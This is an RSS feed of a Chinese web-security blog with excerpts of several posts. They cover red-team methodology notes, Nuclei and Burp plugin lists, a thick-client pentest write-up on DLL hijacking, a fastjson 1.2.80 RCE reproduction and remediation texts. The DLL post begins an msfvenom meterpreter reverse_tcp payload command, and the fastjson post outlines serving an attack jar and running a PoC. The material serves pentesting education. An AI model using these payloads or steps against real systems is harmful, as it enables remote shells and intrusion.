<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>web安全 on Olist.213</title>
    <link>https://olist213.github.io/tags/web%E5%AE%89%E5%85%A8/</link>
    <description>Recent content in web安全 on Olist.213</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Mon, 10 Apr 2023 21:38:19 +0800</lastBuildDate><atom:link href="https://olist213.github.io/tags/web%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Redteam开发与运营</title>
      <link>https://olist213.github.io/posts/redteam_development_and_operations/</link>
      <pubDate>Mon, 10 Apr 2023 21:38:19 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/redteam_development_and_operations/</guid>
      <description>[[RedTeam Development and Operations]] 1、概述 Red Team Development and Operations这本书的阅读笔记，Red Team Development and Operations是一本英文书，通过chatgpt进行了翻译，chatgpt翻译出来的效果确实可以，相比其他的机翻效果更好。
先把笔记贴出来，后期总结书中的具体内容，分开剖析。
2、Highlights  许多组织花费大量时间和金钱来保护其重要数字资产。然而，大多数安全测试都是针对系统合规性或受限范围的审查，这会让这些组织产生虚假的安全感。与此不同的是，那些不仅评估技术，还评估人员和流程的组织，可以显著提高其安全姿态，并调整其有限的安全预算和资源，以保护最关键的资产。通过场景测试和红队技术，我们可以确定组织如何真正应对现实和有决心的威胁。- 乔·维斯特和詹姆斯·塔布维尔 这本书有一个配套网站：http://redteam.guide。这个网站提供了书本内容的增补信息、模板、指南、实验以及其它实用的信息，以帮助读者更好地理解书本内容。 组织是否真正创建了一个应对威胁的安全计划呢？ 在安全规划中是否考虑了威胁的存在？ 不幸的是，许多安全设计常常排除威胁或威胁视角，这种遗漏往往会导致风险的缓解或接受，而这些风险实际上并没有完全被了解或在传统的安全测试和审计中被显露。这种情况导致了一种严重的虚假安全感，而真正的威胁正是利用这一点来谋取利益的。 我们必须理解威胁，以正确开发防御措施。 威胁的定义：故意宣布要报复、伤害等行为的决心或意图，可能是基于某些行动或情况；威胁是可能出现麻烦的表示或警告，是一种威胁的人或事。  可能导致事故发生的潜在原因，可能会对系统和组织造成危害。 信息安全中的威胁包括任何可能未经授权访问、破坏、泄露、修改信息或阻止服务，对组织的运营（包括任务、职责、形象、声誉）、组织的资源、个人、其他组织或国家造成不利影响的任何情况或事件。 威胁是可能对组织产生负面影响的事件。安全运营团队是否正在防御这种威胁？一种负面事件？   将安全运营从“易受攻击”或“不易受攻击”的心态转变为以威胁行为为中心的方法，将极大地提高组织预防、检测和响应真实威胁的能力。深入了解TTP是从威胁的角度理解安全的开始。采用威胁行为来推动防御TTP的组织可以让威胁行为者的生活非常困难，甚至可以保护自己免受未知或零日攻击。 威胁行动者的攻击并不总是按照传统安全测试采取的模式来进行，攻击不是扫描-&amp;gt;利用-&amp;gt;盈利。 终端用户经常因被钓鱼攻击而受到指责。安全防御不应取决于用户的点击决策。如果受害于钓鱼攻击的用户导致系统范围的妥协，那么该用户已经具有提升特权或以其他方式妥协环境的潜力。  不应把遭受钓鱼攻击这种事怪给终端用户，安全防御不应取决于用户的点击，不是终端用户的错误，而是目标环境中安全控制措施不足。 用户教育只是安全操作中的一个防御手段。用户会点击链接，这是他们的工作！   政策，程序和合规措施安全 常见的误解是威胁只使用漏洞利用。这与事实相差甚远。补丁管理是综合安全计划中的关键因素，有助于减少攻击面。威胁者了解这一点，并可能改变他们的策略。这个概念在文本中被进一步探讨和讨论，被称为“非漏洞利用的利用”。 安全行业非常依赖安全工具。不幸的是，很多人不知道这些工具是如何工作的。缺乏理解会导致调试不良和误配置。这些工具应该提高我们的安全防御和分析人员的效率和能力，而不是直接推动安全运营。这些只是工具。如果没有木匠，锤子和钉子是不能建造房子的。 红队行动也可以被称为威胁仿真、威胁模拟、对手仿真、对手模拟，或者一些其他表达基于威胁的安全测试方法的短语。 红色团队是使用战术、技术和程序(TTPs)模拟现实威胁的过程，旨在训练和衡量人员、流程和技术的有效性，用于防御环境。 假设、偏见、误解和怀疑对环境的安全运营产生重要影响。红队通过挑战假设、无视规范和揭露停滞和偏见，提供了强大而诚实的内部实践和安全控制评估。使用红队测量的无偏分析衡量“实际情况”和“应当情况”之间的差距。红队技巧的应用提供无偏见的客观事实和对安全运营作为一个整体的深入理解。 这段话指出了观念、偏见、误解和怀疑对环境的安全运营产生重大影响。红队通过挑战假设、无视常规、揭示萎缩和偏见，提供有力的、诚实的对内部实践和安全控制的评估。使用红队评估的无偏分析可以衡量“现状”与“应该如何”的差距。红队的应用可以提供无偏的基本事实和对安全运营整体的深刻理解。 人们构建系统，人们对能力、功能和安全性做出假设。这些假设导致漏洞被威胁利用。 桌面模拟演习——该活动涉及关键人员模拟情境以回答“如果”问题。实际的技术测试不会发生。可能的结果讨论并以公开讨论的形式进行探讨和检查。 网络演练：一种红蓝方对抗的演练，旨在培训或评估员工和安全操作防御。这种演练可以从重点攻击威胁场景到完整的红蓝方对抗战游戏。 红队测试并不仅关注单一的“漏洞”或“弱点”。在红队测试中，操作人员可能会发现未打补丁或错误配置的系统。这个漏洞可能被用于团队的利益，以便更全面地侵入网络，或从易受攻击的系统中枢转，以实现特定目标，也可能不被使用。虽然单个未打补丁或错误配置的系统可能给红队操作员提供入侵网络的手段，但它只是达成目标的手段。这是红队测试的一个重要区别。 红队关注更广泛的画面，提供对目标检测和响应能力的深入了解。 红队的目标  1、量化评估用于保卫网络的员工、流程和技术的有效性。红色团队提供了一种衡量安全运营整体而不仅仅是关注技术控制的手段。 2、训练或测量防御或安全操作。 3、测试和理解特定威胁或威胁场景。   红队和真实攻击者的区别在哪里？红队将提供报告或其他交付成果，以理解基于威胁的风险。有效使用红队的组织不需要等待并从真实入侵中学习。红队有助于分析系统的安全漏洞，这些漏洞可能不为人所知或不为人所理解。专业红队操作员使用的思维方式和思维过程可以突破严重削弱系统安全的常见假设。红队提出“如果”问题，以挑战系统的根本防御措施。有效地使用红队可以揭示困扰系统多年的安全漏洞，并允许组织开发高度有效的缓解解决方案。 尽管红队带来巨大的好处，但它们使用起来可能具有挑战性，它们通常只是名义上使用。在一个项目期间执行的活动只不过是漏洞测试或渗透测试。输出可能只是一个简单的发现清单。红队必须能够思考并像所扮演的威胁一样行动。这些项目可能是对高级威胁或单一或直接威胁进行模拟，也可能是进行有限行动。 公正无私的红队有助于衡量“现状”与“理想情况”之间的差距，从而揭示整个安全运营的真相。 在早期的红队情景规划中，组织的安全领导描述了谁可以访问他们的会计系统。他们说：“会计部门的5个人可以访问会计系统”。在他们心中，这就是“现状”。在规划威胁情景时，您必须认为这是“应该是”的。这种情况是红队在专业和无偏见的方法中验证假设的完美机会。目标不是证明您可以“黑”入系统，而是了解“现状”与“应该是”的区别。 挑战假设是红队操作的基本理念。 易受攻击性评估、渗透测试和红队测试通常被错误地互换使用，均属于道德黑客的一般类别。这种分类也许可以在有关安全性的高级谈话中使用，但需要做出区分。如果不注意区别，安全专业人员及其客户将继续模糊这些评估类型之间的界限。通过随意定义术语，我们将给自己带来不利影响。这伤害了安全行业和专业人员自己。因此，更有必要确定定义的共识。 对评估类型的误解导致低质量的评估声称自己是高端的。在开始工作之前定义术语将有助于设定期望并提供客户所需的服务。 漏洞评估是“系统性地检查信息系统或产品，以确定安全措施的充分性，确定安全缺陷，提供可以预测拟议安全措施的有效性的数据，并在实施后确认此类措施的充分性”。简而言之，漏洞评估是针对系统的分析，重点是发现漏洞并按风险进行优先排序。 这就是风险评估 渗透测试应被视为攻击路径验证的努力，其目标是减少攻击面。 漏洞评估通常覆盖面广，但深度有限。 红队战略明确关注培训蓝队或衡量安全运营如何影响威胁操作的目标。技术缺陷次于了解威胁能够如何影响组织的操作或安全运营如何能够影响威胁的能力。 红队演练是使用战术、技术和程序(TTPs)来模拟现实世界的威胁，目的是培训和测量用于防御环境的人员、流程和技术的有效性。 红队演练时间  避免使用时间框架来限制范围非常重要。随意设定截止日期可能会对参与质量产生负面影响，因为人工的限制会对范围的延伸产生限制。 建议范围持续时间为两至四周。这样可以方便估算个人参与度，并且可能是更大活动的一部分。在确定范围持续时间时，必须考虑目标的复杂性和规模。 如何使时间和人员资源调配更有效益？考虑以下情 况：一项涉及目标网络 14,000个节点、使用三个操作员、预计工期为六周的项目。你可以通过减少操作员的数量来延长工期至八周，或通过增加员工来缩短工期至四周。规划时应该考虑到时间和人员弹性的限制，以在财务和时间等方面解决限制。然而，这种调整也有其极限和递减收益。过度的调整可能会影响实现项目目标的能力。我们建议为每项项目至少配备两名专门的操作员。   一次性的演练可以根据需要简单或复杂。希望进行一次红队演练的组织可能不知道他们具体需要什么。有效的红队将会访问和质询组织的管理层以更好的确定需要和要求。如果红队不引导这种讨论，那么这次活动很可能会面临成为另一次漏洞评估或渗透测试的风险。一次性的演练是向组织介绍红队演练的良好方式，只要规划受到管理，并关注红队演练的目标和目的。 一次性的演练可以根据需要，可以是简单或者复杂的。组织可能不了解他们所需要的一次红队演练的具体要求。为更好地确定需要和需求，有效的红队操作员将与组织进行沟通和咨询管理层。 如果红队没有引导这种对话，那么这次活动面临成为另一次漏洞评估或渗透测试的风险。只要规划受到管理，并专注于红队演练的目标和目的，一次性的演练是向组织介绍红队演练的良好方式。 在规划中应该优先考虑直接影响组织的意图，而不是仅仅识别技术缺陷的意图。 ATT＆CK分为战术、技术和程序。战术是威胁在操作中可能使用的战术目标。技术描述了威胁采取的行动以实现其目标。程序是执行操作所需的技术步骤。该框架提供了所有威胁行动的分类，无论底层漏洞如何。 简单来说，红队探索“威胁故事”。一个场景为这个故事提供脚本，并驱动红队模拟威胁的方式。红队使用情节来塑造他们的行动并开发他们的TTP。所有这些方面结合在一起才能创建全面的威胁场景。 请记住，红方团队不是像渗透测试一样寻找漏洞或者弱点，而是通过对企业的刺激和影响来全面测量安全运营水平。 威胁仿真是模仿特定威胁的策略、技术和流程（TTPs）的过程，红队扮演代表性威胁来执行威胁仿真。任何类型的威胁都可以模拟仿真，例如：  0day或定制攻击，这类攻击利用对未曾被公开披露的、未被修补的漏洞进行攻击，通常是由黑客团队或特定目标的团体发起的。由于这些攻击方法是新颖且不知名的，因此传统的防御措施可能无法防范这种攻击。 从脚本小子到高级威胁攻击，攻击人员的技术水平差异很大，从仅具有一些简单的技能和技巧的脚本小子到高度技术熟练的专家都有。前者通常使用已经存在的工具和攻击技术，后者则能够制定出更加高级、高效的攻击方式。 特定威胁工具或技术模拟，一些安全团队为了准备应对具体的威胁，可能会模拟特定的黑客工具或攻击手段，例如僵尸网络、DDOS、勒索软件、特定的恶意软件或APT等等。通过模拟这些威胁手段，安全团队能够了解并应对这些具体的威胁。   通常情况下，不要将二进制文件直接放入系统中。首先要使用内置命令来达到目标。虽然这并非总是可行，但使用二进制文件之前必须经过审核、混淆和检测。 永远不要下载（或从目标网络中移除）任何PII、HIPAA、PCI或其他受限制的数据集。一个好的经验法则是在日志中注明数据类型、位置、访问方法和受限数据的访问级别。 利用并不是红队交战的终极目标。利用只是达到目的的手段； 目标环境可能存在多个可利用的漏洞。仅应考虑那些能够实现参与目标和目的的漏洞进行利用。记录所有已识别的可利用漏洞，但只使用达到参与目标所需的漏洞。 无论如何，当威胁使用有效的凭据时，它们看起来和感觉就像内部人员。对于蓝队来说，区分威胁和有效用户可能非常困难。这些都是安全运营能力的重要度量。 红队可以测试威胁获取访问和窃取数据的能力。缺乏监控可能会允许威胁在不被察觉的情况下访问和窃取数据。有弱安全监控流程的蓝队将无法识别威胁造成的恶意流量或更改。防御工具很棒，但必须进行配置和测试以确保其按预期操作。记住，红队的主要角色是促进组织的防御姿态的改进。 一个可靠的策略是将钓鱼邮件发送给一位值得信任的内部人员。这个人将会按照钓鱼的指示点击链接或提供信息。这样就可以在政治上安全的情况下发送钓鱼负载，同时让钓鱼邮件触及所有安全防御措施。这种模式基于用户会屈服于钓鱼攻击的假设。红队的挑战是绕过旨在保护用户免受自身伤害的安全防护措施。 导致单个系统受到威胁的网络钓鱼可能是可以接受的。但导致整个组织陷入威胁的网络钓鱼是不可接受的，因为这需要在组织的各种控制措施（技术、政策、程序等）中出现多个失败。 网络钓鱼攻击导致组织被入侵并非用户的过错，而是目标环境安全控制不足所致！ 在实际目的上，如果威胁有能力在网络中进行横向移动、提升特权、访问敏感信息、外传数据或造成运营影响，那么组织内的其他（或许所有）用户也可能具备这些能力，只是他们不知道如何做而已。 红队经常需要定制代码，以确保其按照特定方式执行，或是删除工具可能留下的迹象。至少，优秀的操作员应该了解工具的功能、引入的影响和潜在风险。卓越的红队操作员能够完全掌握自己的行动，包括工具的使用方式、时机和必要性。 红队通常不使用漏洞扫描器。这些工具通常很嘈杂，并且会产生大量的流量。红队的漏洞识别重点在于OSINT、慢速枚举、智能猜测或其他非侵入性方法。 在运行漏洞扫描器之前应该谨慎，以减少曝光风险，如果需要进行更深入的扫描，可以从一个不被重视的区域上执行扫描，以保护更敏感的区域不被曝光。 只因目标脆弱，并不意味着必须利用它！  </description>
    </item>
    
    <item>
      <title>Nuclei扫描器的一些用法记录</title>
      <link>https://olist213.github.io/posts/nuclei_base/</link>
      <pubDate>Tue, 04 Apr 2023 16:18:09 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/nuclei_base/</guid>
      <description>nuclei配置 1、忽略不需要的poc 编辑~/.config/nuclei/config.yaml文件
一些排除的模版
exclude-templates: - ssl/deprecated-tls.yaml - misconfiguration/http-missing-security-headers.yaml - ssl/tls-version.yaml - miscellaneous/addeventlistener-detect.yaml - technologies/akamai-cache-detect.yaml - technologies/apache/apache-detect.yaml - miscellaneous/apple-app-site-association.yaml - misconfiguration/aspx-debug-mode.yaml - technologies/aws/aws-cloudfront-service.yaml - exposures/configs/azure-domain-tenant.yaml - technologies/basic-auth-detect.yaml - vulnerabilities/generic/cors-misconfig.yaml - exposures/tokens/generic/credentials-disclosure.yaml - ssl/deprecated-tls.yaml - technologies/detect-sentry.yaml - miscellaneous/email-extractor.yaml - ssl/expired-ssl.yaml - technologies/fingerprinthub-web-fingerprints.yaml - technologies/google/google-bucket-service.yaml - technologies/google-frontend-httpserver.yaml - miscellaneous/gpc-json.yaml - misconfiguration/http-missing-security-headers.yaml - vulnerabilities/jira/jira-unauthenticated-user-picker.yaml - technologies/kubernetes/kubelet/kubelet-metrics.yaml - misconfiguration/kubernetes/kubernetes-metrics.yaml - misconfiguration/lvm-exporter-metrics.yaml - technologies/metatag-cms.yaml - ssl/mismatched-ssl.yaml - technologies/nginx/nginx-version.yaml - miscellaneous/old-copyright.yaml - technologies/openresty-detect.yaml - miscellaneous/options-method.yaml - misconfiguration/postgres-exporter-metrics.</description>
    </item>
    
    <item>
      <title>Write_good_bug_reports</title>
      <link>https://olist213.github.io/posts/write_good_bug_reports/</link>
      <pubDate>Mon, 03 Apr 2023 21:22:56 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/write_good_bug_reports/</guid>
      <description>具体要点    确定漏洞类型：首先要明确漏洞的类型，并对其进行分类和描述。
  重现漏洞：在报告中提供重现漏洞的步骤和环境。
  提供详细信息：在漏洞报告中提供尽可能多的信息，例如操作系统，浏览器版本和漏洞所在的应用程序版本等。
  描述漏洞的影响：在报告中描述漏洞的影响和可能对系统造成的损害。
  提供解决方案：在漏洞报告中提供解决方案或建议。
  应该保持专业：在报告中避免使用过度的情绪化或不适当的语言。
  给漏洞指定一个严重程度：给漏洞指定一个适当的严重程度，例如高、中、低等级别。
  与开发人员协作：最好与应用程序的开发团队合作，以便更好地理解和修复漏洞。
  报告漏洞时保密：在报告漏洞时要保持保密，并且只将漏洞信息通知有关方面。
  确认漏洞已得到修复：在漏洞得到修复后，最好要进行验证，以确保漏洞已被妥善修复。
  FROM</description>
    </item>
    
    <item>
      <title>Burpsuite_plugins</title>
      <link>https://olist213.github.io/posts/burpsuite_plugins/</link>
      <pubDate>Mon, 03 Apr 2023 10:12:22 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/burpsuite_plugins/</guid>
      <description>插件名称 url 描述     JS Link Finder BApp Store 被动扫描js文件内的url   Turbo Intruder BApp Store 用于发送大量HTTP请求并分析结果（爆破）   HAE https://github.com/gh0stkey/HaE 请求高亮标记与信息提取   CO2 BApp Store 加了一些工具   BurpShiroPassiveScan https://github.com/pmiaowu/BurpShiroPassiveScan 基于BurpSuite的被动式shiro检测插件   APIKit https://github.com/API-Security/APIKit 主动/被动扫描发现应用泄露的API文档   xia SQL https://github.com/smxiazi/xia_sql 简单的判断注入   BurpFastJsonScan https://github.com/pmiaowu/BurpFastJsonScan 被动式FastJson检测   Log4j2Scan https://github.com/whwlsfb/Log4j2Scan Log4j2被动扫描   log4j2burpscanner https://github.com/f0ng/log4j2burpscanner Log4j2被动扫描   Flow BApp Store 筛选来自Burp工具的所有完整和不完整请求   Autorize BApp Store 授权检测插件   shiro scan https://github.</description>
    </item>
    
    <item>
      <title>记一次胖客户端程序渗透测试</title>
      <link>https://olist213.github.io/posts/thick_client_penetration_testing/</link>
      <pubDate>Sat, 01 Apr 2023 23:13:41 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/thick_client_penetration_testing/</guid>
      <description>胖客户端就是我们常说的C/S架构的应用程序，其主要特点是客户端执行部分应用逻辑，服务器端则提供存储和计算支持，两者之间通过网络进行通信和交互。而我们常说的“瘦客户端”就是基于B/S架构的应用程序，也就是基于浏览器的应用程序。
拿到一个胖客户端程序可以先看下胖客户端是什么架构，一般像后缀是exe结尾的，很多都是C、C#或者.NET编译的。
可以通过CFF Explorer查看目标程序的架构，如下图。
可以看到，这是一个32位的程序，利用Microsoft Visual Studio .NET编译，是一个.net程序。
像这种.NET的程序，可以用dnspy（GitHub - dnSpy/dnSpy: .NET debugger and assembly editor），DNspy是一款著名的.NET反编译器，可以反编译.NET编译后的文件，包括可执行文件（exe）、DLL文件、NET程序集等。使用DNspy反编译exe文件可以方便地查看其源代码和内部结构，帮助理解和分析程序的运行机制。
可以从中看到sql语句查询，从这里我们可以看到sql语句未做任何过滤，直接拼接，但是这里直接加了单引号，导致每次查询都会多有一个单引号，没法绕过。
但是如果客户端程序可以直接反编译的话，那么如果说客户端程序在没做任何签名的情况下，可以重新编译，打包成另一个程序，后果就是可以伪造官方客户端，从中写入恶意文件，通过这种方式可以进行钓鱼等攻击。
此处不放图了，修改后，可以直接像正常客户端程序那样使用。
也可以通过wireshark或者科来对其流量进行检测，检测应用在传输的过程中是否泄漏敏感信息。
从上图可以看出，此胖客户端使用tds数据库协议，节点的ip地址、端口等内容。
还包括在传输过程中泄漏了sql语句
除了wireshark和科来等工具分析流量之外，echo mirage也可以用来进行流量分析，可自行下载使用。
接下来，回到我们的这篇文章的正题，dll劫持漏洞，既然是胖客户端应用，那么就会加载各类dll文件。
DLL劫持（DLL Hijacking）是一种攻击技术，利用系统在加载动态链接库（DLL）时的搜索顺序错误或缺陷，在系统中寻找可用的DLL文件时，将正常的文件替换成恶意文件，使得系统加载并执行了被控制的DLL文件，达到攻击者的目的。
DLL劫持攻击的危害大，可以被用于各种恶意活动，例如：
1、窃取敏感信息：恶意DLL文件可能会窃取用户的敏感信息，例如登录账号、密码等。 2、执行远程指令：通过劫持DLL文件，攻击者可能会远程控制用户的计算机执行恶意指令，例如下载、安装其他恶意程序等。 3、破坏系统的完整性和稳定性：劫持的DLL文件可能会破坏系统的安全性、完整性和稳定性，例如篡改系统设置、破坏系统文件等。
dll劫持利用的第一步是获取可利用的dll文件。
这个时候就的使用Sysinternals Suite套件，利用套件下的Procmon Monitor工具，可以查看当前运行的程序的相关进程情况。
加载后可以看到各类当前运行程序的进程名、PID、路径等，按ctrl+L过滤处特定程序的进程。
同时如果目标程序加载了配置文件的话，通过这个工具也可以查看到。
既然是dll劫持，那么我们就要去找可利用的dll。
在目标程序的目录下，找到了一个DWrite.dll文件，这个文件是Windows操作系统的一部分，它是DirectWrite API动态链接库文件。DirectWrite是一个用于渲染文本和字体的API，它使用硬件加速和先进的字体渲染技术来提供更高质量、更清晰的文本呈现效果。
在Windows系统中，许多应用程序（比如Adobe Creative Suite等）都会使用DirectWrite技术来渲染文本和字体，因此dwrite.dll文件在许多应用程序中都会被调用和使用。
可以通过搜索去搜索NAME NOT FOUND的这种进程。
找dll可以多尝试几个dll文件，除了找到dll文件，还需要了解windows下dll文件的加载顺序。
1、搜索应用程序所在目录 2、Windows系统目录（如C:\Windows\System32） 3、常规的windows目录（ C:\Windows\System32 和 C:\Windows） 4、搜索 Administrator 类型的 Windows 系统目录（如C:\Windows\SystemWOW64） 5、搜索 PATH 环境变量中的所有目录 6、当前工作目录
操作系统按照上述顺序在指定的目录和文件中查找 DLL 文件，并将它们加载到应用程序中。
了解了dll加载顺序，并且找到了dll文件，那么就可以开始构造恶意的dll文件了，通过metasploit框架来进行构造。
msfvenom -p windows/meterpreter/reverse_tcp LHOST= 192.</description>
    </item>
    
    <item>
      <title>一些工具(updating)</title>
      <link>https://olist213.github.io/posts/tools_resoure/</link>
      <pubDate>Sat, 01 Apr 2023 14:01:34 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/tools_resoure/</guid>
      <description>工具名称 工具链接 工具描述 更新时间     Fastjson 扫描器 https://github.com/a1phaboy/FastjsonScan fastjson扫描 无   FastjsonPatrol https://github.com/ce-automne/FastjsonPatrol 一款探测fastjson漏洞的BurpSuite插件 2022.4.1   Log4j2Scan https://github.com/whwlsfb/Log4j2Scan Log4j2 burpsuite被动扫描插件 2022.10.21   SpringBootExploit https://github.com/0x727/SpringBootExploit springboot漏洞利用工具 2022.4.17   EHole(棱洞)3.0 https://github.com/EdgeSecurityTeam/EHole 红队重点攻击系统指纹探测工具 2021.7.23   xray https://github.com/chaitin/xray 自动化安全测试工具 2023.1.10   HackBrowserData https://github.com/moonD4rk/HackBrowserData 提取和导出Chrome、Firefox、Edge、Opera等主流浏览器的历史记录、书签、密码等数据的工具 2022.8.16   fscan https://github.com/shadow1ng/fscan 轻量级的网络安全扫描工具 2023.2.22   Yakit https://github.com/yaklang/yakit ALL-IN-ONE Platform 2023.4.2   pocsuite3 https://github.com/knownsec/pocsuite3 漏洞测试框架 2023.</description>
    </item>
    
    <item>
      <title>fastjson 80远程代码执行漏洞复现</title>
      <link>https://olist213.github.io/posts/fastjson_80_rce/</link>
      <pubDate>Wed, 29 Mar 2023 15:59:44 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/fastjson_80_rce/</guid>
      <description>项目地址 GitHub - Lonely-night/fastjsonVul at 7f9d2d8ea1c27ae1f9c06076849ae76c25b6aff7
利用条件  fastjson版本： 1.2.76 &amp;lt;= fastjson &amp;lt; 1.2.83 存在groovy依赖  复现步骤 1、编译attack模块为attack-1.jar包
2、在attack-1.jar包所在的目录下执行启用http服务。
python -m SimpleHTTPServer 8433
3、运行poc
利用idea重新打开项目，项目路径：
jdk版本切换成1.8
打开poc.java文件，这个文件是漏洞验证的payload。
右键运行
成功运行payload</description>
    </item>
    
    <item>
      <title>网页篡改漏洞描述</title>
      <link>https://olist213.github.io/posts/web_page_tampering/</link>
      <pubDate>Thu, 14 Feb 2019 11:21:08 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/web_page_tampering/</guid>
      <description>网页篡改 风险等级:高危漏洞描述
针对网站程序漏洞，植入木马 (webshell、跨站脚本攻击)，篡改网页，添加黑链或者嵌入非本站信息，甚至是创建恶意网页，通常为博彩、私服篡改居多。
漏洞危害
网站已被恶意攻击者控制，浏览器提示非法网站，不予访问，对网站自身形象不利。
解决建议
1、对服务器进行木马查杀，看是否存在被恶意控制的脚本，对网站进行测试，发现应用存在的缺陷。
2、删除恶意的篡改内容
3、通过申诉，更新快照。
4、部署网页防篡改保护系统
5、通过在线7*24小时云平台进行挂马检测/网页木马检测/黑链检测，通过在线服务平台的挂马特征库（云监控平台自学习系统动态增加挂马特征），对网页的挂马 / 木马和页面特征进行分析，识别出挂马、木马和挂黑链等安全问题。
6、服务器日常的运维过程中，定期通过杀毒软件对服务器进行扫描，定期更换服务器密码，定期删除过期的用户，及时更新操作系统的补丁。</description>
    </item>
    
    <item>
      <title>web漏洞描述与解决建议</title>
      <link>https://olist213.github.io/posts/web_vulnerability_description/</link>
      <pubDate>Fri, 25 Jan 2019 16:42:15 +0800</pubDate>
      
      <guid>https://olist213.github.io/posts/web_vulnerability_description/</guid>
      <description>&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;code&gt;内容均来自互联网，风险等级根据实际情况定义&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;通用建议&#34;&gt;通用建议&lt;/h2&gt;
&lt;p&gt;1、建立和完善一套有效的安全管理制度，对网站的日常维护和使用进行规范。&lt;/p&gt;
&lt;p&gt;2、定期对网站及应用系统进行全面安全检查，保障系统安全运行，如有条件，可聘请第三方专业安全服务公司协助进行。&lt;/p&gt;
&lt;p&gt;3、定期对相关管理人员和技术人员进行安全培训，提高安全技术能力和实际操作能力。&lt;/p&gt;
&lt;p&gt;4、采用专业的Web安全防护产品，可以在不修改网站本身的情况下对大多数的Web攻击起到有效的阻断作用。&lt;/p&gt;</description>
    </item>
    
  </channel>
</rss>
